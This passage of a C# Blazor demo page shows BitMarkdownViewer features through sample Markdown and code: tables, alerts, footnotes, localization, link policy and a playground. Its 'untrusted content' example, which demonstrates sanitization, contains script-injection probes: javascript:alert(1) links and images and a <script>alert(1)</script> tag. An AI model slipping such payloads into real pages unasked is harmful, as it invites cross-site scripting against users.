        BitMarkdownViewerImageRendering.SameOrigin,
        BitMarkdownViewerImageRendering.None,
        BitMarkdownViewerImageRendering.All
    ];

    private BitMarkdownViewerImageRendering imageRendering = BitMarkdownViewerImageRendering.SameOrigin;

    private readonly string untrustedMarkdown = @"### Content from somewhere else

A same-origin image always loads:

![the bit logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png)

A cross-origin one only loads under `All`:

![a remote badge](https://img.shields.io/nuget/v/Bit.BlazorUI.Extras)

Unsafe URLs never survive the sanitizer, whatever the policy:
[a javascript link](javascript:alert(1)) and ![an unsafe image](javascript:alert(1)).

Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
";



    // -- Table of contents example -------------------------------------------

    private record TocEntry(int Level, string Id, string Text);

    private List<TocEntry> tocEntries = [];

    private string tocExcerpt = string.Empty;

    private void HandleParsed(BitMarkdownDocumentNode document)
    {
        tocEntries = BitMarkdownAstHelper.Descendants(document)
                                         .OfType<BitMarkdownHeadingNode>()
                                         .Where(h => string.IsNullOrEmpty(h.Id) is false)
                                         .Select(h => new TocEntry(h.Level, h.Id!, BitMarkdownInlineHelpers.PlainText(h.Inlines)))
                                         .ToList();

        var text = BitMarkdownAstHelper.ToPlainText(document).ReplaceLineEndings(" ");
        tocExcerpt = text.Length > 120 ? text[..120] + "..." : text;
    }

    private readonly string tocMarkdown = @"# Release notes

## 9.4.0

### Added

Footnotes, alerts and reference links.

### Fixed

Truncation no longer splits a surrogate pair.

## 9.3.0

### Added

The whole native parser.
";



    // -- Heading anchors example ---------------------------------------------

    private readonly BitMarkdownPipeline anchorsPipeline = new BitMarkdownPipelineBuilder()
        .UseAutoIdentifiers(anchorLinks: true)
        .Build();

    private readonly string anchorsMarkdown = @"## Installation {#install}

Hover a heading to reveal the permalink beside it. This one names its own id, so the
link to it survives a rewording of the heading.

### Package manager

### .NET CLI
";



    // -- Templates example ---------------------------------------------------

    private readonly string templatesMarkdown = @"Every code block below is drawn by the template, not by the viewer:

```csharp
var pipeline = new BitMarkdownPipelineBuilder().UseGitHubFlavored().Build();
```

```bash
dotnet add package Bit.BlazorUI.Extras
```

And every link, like [the bit platform](https://bitplatform.dev), gets its own chrome.
";



    // -- Interactive task lists example --------------------------------------

    private string taskListMarkdown = @"## Release checklist

- [x] Write the parser
- [x] Write the renderer
- [ ] Write the docs
- [ ] Ship it

Nested items count too:

- [ ] Polish
    - [ ] Icons
    - [ ] Copy
";

    private string taskListStatus = "Tick a box to see the rewritten source.";

    private void HandleTaskChanged(BitMarkdownViewerTaskChangedEventArgs args)
    {
        // The viewer hands over the new source; storing it is what makes the change stick.
        taskListMarkdown = args.Markdown;
        taskListStatus = $"Task {args.Index + 1} is now {(args.Checked ? "done" : "open")}.";
    }



    // -- Link policy example -------------------------------------------------

    private readonly BitMarkdownPipeline linkPolicyPipeline = new BitMarkdownPipelineBuilder()
        .UseLinkOptions(externalTarget: BitMarkdownLinkTarget.Self,
                        externalRel: "noopener noreferrer nofollow ugc")
        .Build();

    private readonly string linkPolicyMarkdown = @"A link a reader wrote to [somewhere else](https://example.com)
opens in the same tab and is marked `nofollow ugc`.

A link to [another page here](/components/markdownviewer) is untouched, and so is one to
[a section](#example1) of this page.
";



    // -- Rewriting URLs example ----------------------------------------------

    private readonly BitMarkdownPipeline baseUrlPipeline = new BitMarkdownPipelineBuilder()
        .UseBaseUrl("/_content/Bit.BlazorUI.Demo.Client.Core/images/")
        .Build();

    private readonly string baseUrlMarkdown = @"![the bit logo](bit-logo-blue.png)

The image above is written with a relative path, the way a README in a repository writes one.
An [absolute link](https://bitplatform.dev) is left alone.
";



    // -- Localization example ------------------------------------------------

    private readonly BitMarkdownPipeline localizedPipeline = new BitMarkdownPipelineBuilder()
        .UseGitHubFlavored()
        .UseTexts(new BitMarkdownTexts
        {
            AlertNote = "توجه",
            AlertTip = "نکته",
            AlertImportant = "مهم",
            AlertWarning = "هشدار",
            AlertCaution = "احتیاط",
            Footnotes = "پی‌نوشت‌ها",
            FootnoteBackReference = "بازگشت به ارجاع {0}",
            FootnoteBackReferenceOccurrence = "بازگشت به ارجاع {0}-{1}",
            Table = "جدول",
        })
        .Build();

    private readonly string localizedMarkdown = @"> [!WARNING]
> عنوان این کادر از تنظیمات زبان خوانده می‌شود، نه از متن.

جدول و پی‌نوشت هم نام‌های خودشان را از همان‌جا می‌گیرند[^۱].

| ستون | مقدار |
|:-----|------:|
| یک   |     ۱ |

[^۱]: نام پیوند بازگشت هم ترجمه شده است.
";



    // -- Playground example --------------------------------------------------

    private MarkdownFlavor playgroundFlavor = MarkdownFlavor.Advanced;
    private BitMarkdownPipeline playgroundPipeline = BitMarkdownPipelines.Advanced;
    private string playgroundMarkdown = SampleMarkdown;

    private void SetPlaygroundFlavor(MarkdownFlavor flavor)
    {
        playgroundFlavor = flavor;
        playgroundPipeline = flavor switch
        {
            MarkdownFlavor.Basic => BitMarkdownPipelines.Basic,
            MarkdownFlavor.GitHub => BitMarkdownPipelines.GitHub,
            _ => BitMarkdownPipelines.Advanced
        };
    }

    private void ResetPlaygroundSample() => playgroundMarkdown = SampleMarkdown;

    private string playgroundHint => playgroundFlavor switch
    {
        MarkdownFlavor.Basic => "Basic CommonMark only - reference links and character references still work, but tables, strikethrough, task lists, footnotes, alerts, emoji and bare URLs render as plain text.",
        MarkdownFlavor.GitHub => "The GitHub flavors: pipe tables, ~~strikethrough~~, task lists, autolink literals, footnotes and alerts.",
        _ => "Advanced: the GitHub flavors plus front matter, the emphasis extras (~sub~, ^sup^, ++ins++, ==mark==), :::containers, definition lists, abbreviations, figures, :sparkles: emoji and automatic heading ids."
    };

    private const string SampleMarkdown = """
        # BitMarkdownViewer

        A **native Blazor** Markdown viewer written in _pure C#_ - no JavaScript,
        no `innerHTML`, and ~~no external dependencies~~ zero external dependencies.

        ## Why it exists

        Most Blazor Markdown components wrap a JavaScript library and marshal strings
        across the interop boundary. This one parses Markdown into an AST and renders
        it straight to the Blazor render tree, so the output is **real DOM**.

        ### Feature highlights

        - Headings (ATX `#` and Setext)
        - **Bold**, *italic*, ***bold italic***, and ~~strikethrough~~
        - H~2~O, x^2^, ++inserted++ and ==highlighted== (the emphasis extras)
        - `inline code` and fenced code blocks
        - [Links](https://learn.microsoft.com/aspnet/core/blazor) and images
        - Ordered and unordered lists, including nesting:
            1. First item
            2. Second item
                - nested bullet
                - another one
            3. Third item
        - GitHub-style task lists:
            - [x] Parse blocks
            - [x] Parse inlines
            - [ ] Conquer the world

        ## Code

        Inline: `var viewer = new BitMarkdownViewer();`

        ```csharp
        public static BitMarkdownDocumentNode Parse(string? markdown)
        {
            var document = new BitMarkdownDocumentNode();
            if (string.IsNullOrEmpty(markdown))
                return document;
            return document;
        }
        ```

        ## Alerts

        > [!TIP]
        > Switch the Flavor above to Basic and watch this become an ordinary block quote.

        ## Blockquotes

        > "Any sufficiently advanced technology is indistinguishable from magic."
        >
        > - Arthur C. Clarke

        ## Tables

        | Feature        | Supported | Notes                  |
        | :------------- | :-------: | ---------------------: |
        | Headings       |    Yes    | Levels 1-6             |
        | Tables         |    Yes    | With column alignment  |
        | Task lists     |    Yes    | GitHub flavoured       |
        | Raw HTML       |    No     | Escaped for safety     |

        ## Links and notes

        Reference links keep the prose clean[^why]: see the [bit platform][bit] site.

        [bit]: https://bitplatform.dev "bit platform"
        [^why]: The destination is declared once, at the bottom, instead of interrupting
            the sentence.

        ## Safety

        Link and image URLs are sanitized, so `javascript:` URIs are stripped and raw
        HTML in the source is rendered as text rather than executed.

        ## Plugins (try the Flavor switch above)

        With the **Advanced** flavor you also get emoji and autolinks:

        - Emoji shortcodes: :rocket: :sparkles: :tada: :fire: :+1:
        - Bare URLs become links: https://learn.microsoft.com
        - Email autolinks: support@example.com
        - Character references: &copy; 2026 &mdash; decoded everywhere but in `code`

        Switch to **Basic** to see the same source rendered as plain CommonMark.

        ---

        Made with C# and the Blazor render tree.
        """;



    // -- RTL example ---------------------------------------------------------

    private readonly string rtlMarkdown = @"# نمایشگر مارک‌داون

متن **درشت** و *مورب* در کنار `کد درون‌خطی`.

> [!NOTE]
> نوار رنگی این کادر با جهت متن جابه‌جا می‌شود.

- مورد اول
- مورد دوم
    - مورد تودرتو

| ستون | مقدار |
|:-----|------:|
| یک   |     ۱ |
| دو   |     ۲ |
";



    private readonly string example1RazorCode = @"
<BitMarkdownViewer Markdown=""@(""# Native Markdown in Blazor\n\nRendered entirely in **C#** with no JavaScript and no third-party packages.\n\n- Real DOM output\n- Safe by default\n- Zero interop"")"" />";

    private readonly string example2RazorCode = @"
<BitMarkdownViewer Markdown=""@gitHubMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
    private readonly string example2CsharpCode = @"
private readonly string gitHubMarkdown = @""# GitHub Flavored Markdown

Supports ~~strikethrough~~ and bare links like https://bitplatform.dev

## Task list

- [x] Parse Markdown in pure C#
- [x] Render the real render tree
- [ ] Use any JavaScript

## Table

| Feature       | Basic | GitHub |
|:--------------|:-----:|:------:|
| Headings      |   ✔   |   ✔    |
| Tables        |       |   ✔    |
| Strikethrough |       |   ✔    |
"";";

    private readonly string example3RazorCode = @"
<BitMarkdownViewer Markdown=""@alertsMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
    private readonly string example3CsharpCode = @"
private readonly string alertsMarkdown = @""> [!NOTE]
> Useful information that users should know, even when skimming content.

> [!TIP]
> Helpful advice for doing things better or more easily.

> [!IMPORTANT]
> Key information users need to know to achieve their goal.

> [!WARNING]
> Urgent info that needs immediate user attention to avoid problems.

> [!CAUTION]
> Advises about risks or negative outcomes of certain actions.

> A block quote without a marker is still an ordinary block quote.
"";";

    private readonly string example4RazorCode = @"
<BitMarkdownViewer Markdown=""@footnotesMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"" />";
    private readonly string example4CsharpCode = @"
private readonly string footnotesMarkdown = @""The parser walks the source once[^once] and hands the renderer an AST[^ast],
which is why the same note can be cited twice[^once].

[^once]: One pass over the lines, then one pass over the inline text of each block.
[^ast]: An abstract syntax tree - the tree of headings, paragraphs and inline runs
    that the render tree is built from.
"";";

    private readonly string example5RazorCode = @"
<BitMarkdownViewer Markdown=""@referencesMarkdown"" />";
    private readonly string example5CsharpCode = @"
private readonly string referencesMarkdown = @""# Reference links

The [bit platform][bit] site, the [Blazor docs][docs], and the same
[bit] link again as a shortcut reference.

Character references are decoded too: &copy; 2026 &mdash; &#169; is the same
sign written as a number, and &#x2705; as hex. Inside code they stay literal:
`&copy;`.

[bit]: https://bitplatform.dev """"bit platform""""
[docs]: https://learn.microsoft.com/aspnet/core/blazor """"ASP.NET Core Blazor""""
"";";

    private readonly string example6RazorCode = @"
<BitMarkdownViewer Markdown=""@emphasisExtrasMarkdown"" Pipeline=""@emphasisExtrasPipeline"" />";
    private readonly string example6CsharpCode = @"
private readonly BitMarkdownPipeline emphasisExtrasPipeline = new BitMarkdownPipelineBuilder()
    .UseEmphasisExtras()
    .Build();

private readonly string emphasisExtrasMarkdown = @""Water is H~2~O, the area of a circle is πr^2^, and 2^10^ = 1024.

This release ++adds streaming++ and ~~drops the old overload~~, so ==read the migration notes== first.

Ordinary prose is left alone: 1 + 2 = 3, and a+b is not inserted text.
"";";

    private readonly string example7RazorCode = @"
<div class=""mdv-columns"">
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">Default</div>
        <BitMarkdownViewer Markdown=""@typographyMarkdown"" />
    </div>
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">UseSmartyPants()</div>
        <BitMarkdownViewer Markdown=""@typographyMarkdown"" Pipeline=""@smartyPantsPipeline"" />
    </div>
</div>";
    private readonly string example7CsharpCode = @"
private readonly BitMarkdownPipeline smartyPantsPipeline = new BitMarkdownPipelineBuilder()
    .UseSmartyPants()
    .Build();

private readonly string typographyMarkdown = @""""""Typography matters,"""" she said -- and it's hard to disagree...

The 2024--2026 range uses an en dash; an aside uses an em dash --- like this one.

Code keeps every character: `--- """"not curled"""" ...`
"";";

    private readonly string example8RazorCode = @"
<div class=""mdv-columns"">
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">Default</div>
        <BitMarkdownViewer Markdown=""@frontMatterMarkdown"" />
    </div>
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">UseFrontMatter()</div>
        <BitMarkdownViewer Markdown=""@frontMatterMarkdown"" Pipeline=""@frontMatterPipeline"" OnParsed=""HandleFrontMatterParsed"" />
        <div class=""mdv-hint"">Metadata read from the AST: @frontMatterText</div>
    </div>
</div>";
    private readonly string example8CsharpCode = @"
private readonly BitMarkdownPipeline frontMatterPipeline = new BitMarkdownPipelineBuilder()
    .UseFrontMatter()
    .Build();

private string frontMatterText = string.Empty;

private void HandleFrontMatterParsed(BitMarkdownDocumentNode document)
{
    var frontMatter = BitMarkdownFrontMatterNode.Find(document);
    frontMatterText = frontMatter is null ? ""(none)"" : frontMatter.Text.ReplaceLineEndings("" | "");
}

private readonly string frontMatterMarkdown = @""---
title: Release notes
date: 2026-09-09
tags: [blazor, markdown]
---

# Release notes

The metadata above describes the file; it is not part of the document.
"";";

    private readonly string example9RazorCode = @"
<BitMarkdownViewer Markdown=""@containersMarkdown"" Pipeline=""@containersPipeline"" />";
    private readonly string example9CsharpCode = @"
private readonly BitMarkdownPipeline containersPipeline = new BitMarkdownPipelineBuilder()
    .UseContainers()
    .Build();

private readonly string containersMarkdown = @"":::tip Start here
Containers are fenced with three colons. The first word names the container.
:::

:::warning Read this first
The rest of the line is the title, and the body is **ordinary Markdown**.

:::note
Containers nest, so an aside can sit inside one.
:::

:::

:::details How the fence is read
The word after the fence names the container; the rest of the line is its title.

This one is a real `<details>`, so it opens and closes.
:::

:::glossary
A name the stylesheet has no opinion about is a plain block you style yourself.
:::
"";";

    private readonly string example10RazorCode = @"
<BitMarkdownViewer Markdown=""@definitionListMarkdown"" Pipeline=""@definitionListPipeline"" />";
    private readonly string example10CsharpCode = @"
private readonly BitMarkdownPipeline definitionListPipeline = new BitMarkdownPipelineBuilder()
    .UseDefinitionLists()
    .Build();

private readonly string definitionListMarkdown = @""Pipeline
: The immutable set of flavors a document is parsed with.
: Build it once and share it.

AST
: The tree of headings, paragraphs and inline runs the parser produces.

    A definition indented under its own text may run to several paragraphs,
    or hold a list:

    - one
    - two
"";";

    private readonly string example11RazorCode = @"
<BitMarkdownViewer Markdown=""@abbreviationMarkdown"" Pipeline=""@abbreviationPipeline"" />";
    private readonly string example11CsharpCode = @"
private readonly BitMarkdownPipeline abbreviationPipeline = new BitMarkdownPipelineBuilder()
    .UseAbbreviations()
    .Build();

private readonly string abbreviationMarkdown = @""*[HTML]: HyperText Markup Language
*[AST]: Abstract Syntax Tree
*[CSP]: Content Security Policy

The parser builds an AST and the renderer writes HTML from it, which is what keeps
the output usable under a strict CSP.

Only whole words are expanded, so HTMLElement keeps its own name and `HTML` inside
code stays literal.
"";";

    private readonly string example12RazorCode = @"
<BitMarkdownViewer Markdown=""@mathMarkdown"" Pipeline=""@mathPipeline"" />";
    private readonly string example12CsharpCode = @"
private readonly BitMarkdownPipeline mathPipeline = new BitMarkdownPipelineBuilder()
    .UseMathematics()
    .Build();

private readonly string mathMarkdown = @""Euler's identity, $e^{i\pi} + 1 = 0$, in one line.

$$
\int_0^1 x^2 \, dx = \frac{1}{3}
$$

Without a typesetter on the page the TeX reads as itself. Prices are left alone:
this costs $5 and that one $10.
"";";

    private readonly string example13RazorCode = @"
<BitMarkdownViewer Markdown=""@figureMarkdown"" Pipeline=""@figurePipeline"" />";
    private readonly string example13CsharpCode = @"
private readonly BitMarkdownPipeline figurePipeline = new BitMarkdownPipelineBuilder()
    .UseFigures()
    .Build();

private readonly string figureMarkdown = @""![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png """"The logo, as a captioned figure"""")

An image with no title stays an ordinary image:

![The bit platform logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png)
"";";

    private readonly string example14RazorCode = @"
<div class=""mdv-columns"">
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">Default</div>
        <BitMarkdownViewer Markdown=""@lineBreaksMarkdown"" />
    </div>
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">UseSoftLineAsHardLine()</div>
        <BitMarkdownViewer Markdown=""@lineBreaksMarkdown"" Pipeline=""@softBreakPipeline"" />
    </div>
</div>";
    private readonly string example14CsharpCode = @"
private readonly BitMarkdownPipeline softBreakPipeline = new BitMarkdownPipelineBuilder()
    .UseSoftLineAsHardLine()
    .Build();

private readonly string lineBreaksMarkdown = @""Roses are red
Violets are blue
Markdown reflows
Unless you tell it not to"";";

    private readonly string example15RazorCode = @"
<BitMarkdownViewer Markdown=""@customMarkdown"" Pipeline=""customPipeline"" />";
    private readonly string example15CsharpCode = @"
private readonly BitMarkdownPipeline customPipeline = new BitMarkdownPipelineBuilder()
    .UsePipeTables()
    .UseStrikethrough()
    .UseTaskLists()
    .UseEmojis()
    .UseAutoIdentifiers()
    .Build();

private readonly string customMarkdown = @""# Custom pipeline :sparkles:

This viewer uses a pipeline composed with only the extensions we picked:
pipe tables, strikethrough, task lists, emoji and auto identifiers.
Autolinks were left out, so https://bitplatform.dev stays plain text.

- [x] ~~Old~~ approach replaced
- [ ] Anything left to do?
"";";

    private readonly string example16RazorCode = @"
<div class=""mdv-toolbar"">
    <span class=""mdv-label"">ImageRendering:</span>
    @foreach (var mode in imageRenderingModes)
    {
        <BitButton Size=""BitSize.Small""
                   aria-pressed=""@(imageRendering == mode)""
                   Variant=""@(imageRendering == mode ? BitVariant.Fill : BitVariant.Outline)""
                   OnClick=""@(() => imageRendering = mode)"">@mode</BitButton>
    }
</div>
<BitMarkdownViewer Markdown=""@untrustedMarkdown""
                   Pipeline=""BitMarkdownPipelines.GitHub""
                   ImageRendering=""@imageRendering""
                   StripBidiControlCharacters=""true""
                   MaxLength=""100000"" />";
    private readonly string example16CsharpCode = @"
private static readonly BitMarkdownViewerImageRendering[] imageRenderingModes =
[
    BitMarkdownViewerImageRendering.SameOrigin,
    BitMarkdownViewerImageRendering.None,
    BitMarkdownViewerImageRendering.All
];

private BitMarkdownViewerImageRendering imageRendering = BitMarkdownViewerImageRendering.SameOrigin;

private readonly string untrustedMarkdown = @""### Content from somewhere else

A same-origin image always loads:

![the bit logo](/_content/Bit.BlazorUI.Demo.Client.Core/images/bit-logo-blue.png)

A cross-origin one only loads under `All`:

![a remote badge](https://img.shields.io/nuget/v/Bit.BlazorUI.Extras)

Unsafe URLs never survive the sanitizer, whatever the policy:
[a javascript link](javascript:alert(1)) and ![an unsafe image](javascript:alert(1)).

Raw <b>HTML</b> and <script>alert(1)</script> are rendered as text.
"";";

    private readonly string example17RazorCode = @"
<div class=""mdv-toc-layout"">
    <nav class=""mdv-toc"" aria-label=""On this page"">
        <div class=""mdv-toc-title"">On this page</div>
        @foreach (var entry in tocEntries)
        {
            <a class=""@($""mdv-toc-item mdv-toc-level-{entry.Level}"")"" href=""@($""#{entry.Id}"")"">@entry.Text</a>
        }
    </nav>
    <BitMarkdownViewer Markdown=""@tocMarkdown"" Pipeline=""BitMarkdownPipelines.Advanced"" OnParsed=""HandleParsed"" />
</div>
<div>Excerpt: @tocExcerpt</div>";
    private readonly string example17CsharpCode = @"
private record TocEntry(int Level, string Id, string Text);

private List<TocEntry> tocEntries = [];

private string tocExcerpt = string.Empty;

private void HandleParsed(BitMarkdownDocumentNode document)
{
    tocEntries = BitMarkdownAstHelper.Descendants(document)
                                     .OfType<BitMarkdownHeadingNode>()
                                     .Where(h => string.IsNullOrEmpty(h.Id) is false)
                                     .Select(h => new TocEntry(h.Level, h.Id!, BitMarkdownInlineHelpers.PlainText(h.Inlines)))
                                     .ToList();

    var text = BitMarkdownAstHelper.ToPlainText(document).ReplaceLineEndings("" "");
    tocExcerpt = text.Length > 120 ? text[..120] + ""..."" : text;
}

private readonly string tocMarkdown = @""# Release notes

## 9.4.0

### Added

Footnotes, alerts and reference links.

### Fixed

Truncation no longer splits a surrogate pair.

## 9.3.0

### Added

The whole native parser.
"";";

    private readonly string example18RazorCode = @"
<BitMarkdownViewer Markdown=""@anchorsMarkdown"" Pipeline=""@anchorsPipeline"" />";
    private readonly string example18CsharpCode = @"
private readonly BitMarkdownPipeline anchorsPipeline = new BitMarkdownPipelineBuilder()
    .UseAutoIdentifiers(anchorLinks: true)
    .Build();

private readonly string anchorsMarkdown = @""## Installation {#install}

Hover a heading to reveal the permalink beside it. This one names its own id, so the
link to it survives a rewording of the heading.

### Package manager

### .NET CLI
"";";

    private readonly string example19RazorCode = @"
Formatting a value in place:
<BitMarkdownViewer Inline Markdown=""@(""the **fastest** path is `Span<T>` - [read why](https://learn.microsoft.com/dotnet/api/system.span-1)"")"" />";

    private readonly string example20RazorCode = @"
<BitMarkdownViewer Markdown=""@templatesMarkdown"" Pipeline=""BitMarkdownPipelines.GitHub"">
    <CodeBlockTemplate>
        <div class=""code-card"">
            <div class=""code-card-head"">
                <span>@(context.Info ?? ""text"")</span>
                <BitButton Size=""BitSize.Small"" Variant=""BitVariant.Text"" IconName=""@BitIconName.Copy"" Title=""Copy"" />
            </div>
            <pre><code>@context.Content</code></pre>
        </div>
    </CodeBlockTemplate>
    <LinkTemplate>
        <BitLink Href=""@context.Url"">
            @BitMarkdownInlineHelpers.PlainText(context.Children)
            <BitIcon IconName=""@BitIconName.NavigateExternalInline"" />
        </BitLink>
    </LinkTemplate>
</BitMarkdownViewer>";

    private readonly string example21RazorCode = @"
<BitMarkdownViewer Markdown=""@taskListMarkdown""
                   Pipeline=""BitMarkdownPipelines.GitHub""
                   OnTaskChanged=""HandleTaskChanged"" />
<div>@taskListStatus</div>";
    private readonly string example21CsharpCode = @"
private string taskListMarkdown = @""## Release checklist

- [x] Write the parser
- [x] Write the renderer
- [ ] Write the docs
- [ ] Ship it

Nested items count too:

- [ ] Polish
    - [ ] Icons
    - [ ] Copy
"";

private string taskListStatus = ""Tick a box to see the rewritten source."";

private void HandleTaskChanged(BitMarkdownViewerTaskChangedEventArgs args)
{
    // The viewer hands over the new source; storing it is what makes the change stick.
    taskListMarkdown = args.Markdown;
    taskListStatus = $""Task {args.Index + 1} is now {(args.Checked ? ""done"" : ""open"")}."";
}";

    private readonly string example22RazorCode = @"
<BitMarkdownViewer Markdown=""@linkPolicyMarkdown"" Pipeline=""@linkPolicyPipeline"" />";
    private readonly string example22CsharpCode = @"
private readonly BitMarkdownPipeline linkPolicyPipeline = new BitMarkdownPipelineBuilder()
    .UseLinkOptions(externalTarget: BitMarkdownLinkTarget.Self,
                    externalRel: ""noopener noreferrer nofollow ugc"")
    .Build();

private readonly string linkPolicyMarkdown = @""A link a reader wrote to [somewhere else](https://example.com)
opens in the same tab and is marked `nofollow ugc`.

A link to [another page here](/components/markdownviewer) is untouched, and so is one to
[a section](#example1) of this page.
"";";

    private readonly string example23RazorCode = @"
<div class=""mdv-columns"">
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">Default</div>
        <BitMarkdownViewer Markdown=""@baseUrlMarkdown"" ImageRendering=""BitMarkdownViewerImageRendering.All"" />
    </div>
    <div class=""mdv-column"">
        <div class=""mdv-column-title"">UseBaseUrl(...)</div>
        <BitMarkdownViewer Markdown=""@baseUrlMarkdown"" Pipeline=""@baseUrlPipeline"" ImageRendering=""BitMarkdownViewerImageRendering.All"" />
    </div>
</div>";
    private readonly string example23CsharpCode = @"
private readonly BitMarkdownPipeline baseUrlPipeline = new BitMarkdownPipelineBuilder()
    .UseBaseUrl(""/_content/Bit.BlazorUI.Demo.Client.Core/images/"")
    .Build();

// The general form, for a CDN or for stripping tracking parameters:
// new BitMarkdownPipelineBuilder()
//     .UseUrlRewriter(context => context.IsImage && context.IsRelative
//         ? ""https://cdn.example.com/"" + context.Url
//         : context.Url)
//     .Build();

private readonly string baseUrlMarkdown = @""![the bit logo](bit-logo-blue.png)

The image above is written with a relative path, the way a README in a repository writes one.
An [absolute link](https://bitplatform.dev) is left alone.
"";";

    private readonly string example24RazorCode = @"
<BitMarkdownViewer Dir=""BitDir.Rtl"" Markdown=""@localizedMarkdown"" Pipeline=""@localizedPipeline"" />";
    private readonly string example24CsharpCode = @"
private readonly BitMarkdownPipeline localizedPipeline = new BitMarkdownPipelineBuilder()
    .UseGitHubFlavored()
    .UseTexts(new BitMarkdownTexts
    {
        AlertNote = ""توجه"",
        AlertTip = ""نکته"",
        AlertImportant = ""مهم"",
        AlertWarning = ""هشدار"",
        AlertCaution = ""احتیاط"",
        Footnotes = ""پی‌نوشت‌ها"",
        FootnoteBackReference = ""بازگشت به ارجاع {0}"",
        FootnoteBackReferenceOccurrence = ""بازگشت به ارجاع {0}-{1}"",
        Table = ""جدول"",
    })
    .Build();";

    private readonly string example25RazorCode = @"
<div class=""mdv-playground"">
    <div class=""mdv-toolbar"">
        <span class=""mdv-label"">Flavor:</span>
        <BitButton Size=""BitSize.Small""
                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.Basic)""
                   Variant=""@(playgroundFlavor == MarkdownFlavor.Basic ? BitVariant.Fill : BitVariant.Outline)""
                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.Basic))"">Basic</BitButton>
        <BitButton Size=""BitSize.Small""
                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.GitHub)""
                   Variant=""@(playgroundFlavor == MarkdownFlavor.GitHub ? BitVariant.Fill : BitVariant.Outline)""
                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.GitHub))"">GitHub</BitButton>
        <BitButton Size=""BitSize.Small""
                   aria-pressed=""@(playgroundFlavor == MarkdownFlavor.Advanced)""
                   Variant=""@(playgroundFlavor == MarkdownFlavor.Advanced ? BitVariant.Fill : BitVariant.Outline)""
                   OnClick=""@(() => SetPlaygroundFlavor(MarkdownFlavor.Advanced))"">Advanced</BitButton>
        <span class=""mdv-spacer""></span>
        <BitButton Size=""BitSize.Small"" Variant=""BitVariant.Text"" OnClick=""ResetPlaygroundSample"">Reset sample</BitButton>
        <BitButton Size=""BitSize.Small"" Variant=""BitVariant.Text"" OnClick=""@(() => playgroundMarkdown = string.Empty)"">Clear</BitButton>
    </div>

    <div class=""mdv-hint"">@playgroundHint</div>

    <div class=""mdv-split"">
        <textarea class=""mdv-editor"" spellcheck=""false"" aria-label=""Markdown editor"" @bind=""playgroundMarkdown"" @bind:event=""oninput""></textarea>
        <div class=""mdv-preview"">
            <BitMarkdownViewer Markdown=""@playgroundMarkdown""
                               Pipeline=""@playgroundPipeline""
                               ImageRendering=""BitMarkdownViewerImageRendering.SameOrigin""
                               StripBidiControlCharacters=""true""
                               MaxLength=""100000"" />
        </div>
    </div>
</div>";
    private readonly string example25CsharpCode = @"
private enum MarkdownFlavor { Basic, GitHub, Advanced }

private MarkdownFlavor playgroundFlavor = MarkdownFlavor.Advanced;
private BitMarkdownPipeline playgroundPipeline = BitMarkdownPipelines.Advanced;
private string playgroundMarkdown = SampleMarkdown; // a feature-rich sample document

private void SetPlaygroundFlavor(MarkdownFlavor flavor)
{
    playgroundFlavor = flavor;
    playgroundPipeline = flavor switch
    {
        MarkdownFlavor.Basic => BitMarkdownPipelines.Basic,
        MarkdownFlavor.GitHub => BitMarkdownPipelines.GitHub,
        _ => BitMarkdownPipelines.Advanced
    };
}

private void ResetPlaygroundSample() => playgroundMarkdown = SampleMarkdown;

private string playgroundHint => playgroundFlavor switch
{
    MarkdownFlavor.Basic => ""Basic CommonMark only - reference links and character references still work, but tables, strikethrough, task lists, footnotes, alerts, emoji and bare URLs render as plain text."",
    MarkdownFlavor.GitHub => ""The GitHub flavors: pipe tables, ~~strikethrough~~, task lists, autolink literals, footnotes and alerts."",
    _ => ""Advanced: the GitHub flavors plus front matter, the emphasis extras, containers, definition lists, abbreviations, figures, :sparkles: emoji and automatic heading ids.""
};";

    private readonly string example26RazorCode = @"
<BitMarkdownViewer Style=""border-inline-start:0.25rem solid var(--bit-clr-pri);padding-inline-start:1rem""
                   Markdown=""@(""A **styled** viewer, set apart with an inline `Style`."")"" />

<BitMarkdownViewer Class=""custom-mdv""
                   Markdown=""@(""### A classy viewer\n\nEvery `code` span and heading inside it is restyled from the page's own stylesheet."")"" />";
    private readonly string example26ScssCode = @"
::deep .custom-mdv {
    padding: 1rem;
    border-radius: 0.5rem;
    background: $bit-color-background-secondary;

    h3 {
        margin-top: 0;
        color: $bit-color-primary;
    }

    code {
        color: $bit-color-primary-dark;
        background: $bit-color-background-primary-light;
    }
}";
    private readonly DemoCodeFile[] example26CodeFiles;

    private readonly string example27RazorCode = @"
<BitMarkdownViewer Dir=""BitDir.Rtl"" Markdown=""@rtlMarkdown"" Pipeline=""BitMarkdownPipelines.Advanced"" />";
    private readonly string example27CsharpCode = @"
private readonly string rtlMarkdown = @""# نمایشگر مارک‌داون

متن **درشت** و *مورب* در کنار `کد درون‌خطی`.

> [!NOTE]
> نوار رنگی این کادر با جهت متن جابه‌جا می‌شود.

- مورد اول
- مورد دوم
    - مورد تودرتو

| ستون | مقدار |
|:-----|------:|
| یک   |     ۱ |
| دو   |     ۲ |
"";";

    public BitMarkdownViewerDemo()
    {
        example26CodeFiles =
        [
            new("BitMarkdownViewerDemo.razor.scss", example26ScssCode),
        ];
    }
}
